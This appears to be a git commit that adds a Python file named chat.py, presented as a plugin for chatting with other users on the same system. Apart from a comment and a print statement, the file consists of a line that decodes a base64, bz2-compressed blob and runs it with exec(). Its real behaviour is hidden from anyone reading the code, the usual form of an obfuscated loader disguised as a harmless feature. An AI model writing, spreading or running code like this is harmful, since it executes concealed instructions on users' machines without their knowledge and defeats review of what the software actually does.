ca4d25faa73aff0ad4503e80a897f38318e289cb
lukas <63365889+lukgth@users.noreply.github.com>
2021-04-22 20:07:12 +0200

    Add Chat Plugin

---
+++ bin/bin/programs/chat.py
@@ -0,0 +1,5 @@
+# chat with other system users
+import bz2, base64
+
+print('Type `chat` to chat with somebody else on your system!')
+exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWf3jg/wAACtfgAAQUPGAEgCARAA3597gIACFCVNTKem0p6j1GyjygyeUIBTTQaGj1AAepyVPt9N6nqVm2IsuYgCdChMzszBmrNaMtAnEuORVhNBHt4UR/nxJe7jgc8V5STcx1SHzfbqmmCQ+vZqUAxOYUuTAbrBVj84GOU4pzdNiFnDRRVEYijesl/i7kinChIfvHB/g')))
